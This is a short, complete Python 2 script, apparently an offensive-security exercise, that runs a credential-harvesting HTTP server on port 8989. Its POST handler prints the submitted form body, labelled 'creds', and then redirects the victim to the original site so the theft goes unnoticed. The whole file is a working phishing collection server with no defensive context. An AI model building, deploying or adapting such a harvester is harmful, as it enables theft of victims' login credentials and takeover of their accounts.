import SimpleHTTPServer
import SocketServer
import urllib


class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_GET(self):
        print self.headers
        self.send_response(200)
        self.end_headers()
        # self.send_response("OK")
        return

    def do_POST(self):
        content_length = int(self.headers["Content-Length"])
        creds = self.rfile.read(content_length).decode("utf-8")
        print creds

        site = self.path[1:]
        self.send_response(301)
        self.send_header("Location", urllib.quote(site))
        self.end_headers()


server = SocketServer.TCPServer(("0.0.0.0", 8989), CredRequestHandler)
server.serve_forever()
